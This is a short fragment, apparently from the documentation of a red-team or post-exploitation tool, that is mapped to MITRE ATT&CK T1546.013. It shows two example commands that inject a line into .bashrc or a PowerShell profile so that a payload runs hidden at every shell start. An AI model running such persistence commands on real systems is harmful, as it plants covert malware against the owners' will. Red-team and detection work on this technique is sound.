...
shell-config -action inject -file .bashrc -line "/tmp/payload &" -comment "killa"
...
shell-config -action inject -line "Start-Process C:\temp\payload.exe -WindowStyle Hidden" -comment "killa"
...
- **T1546.013** â€” Event Triggered Execution: PowerShell Profile
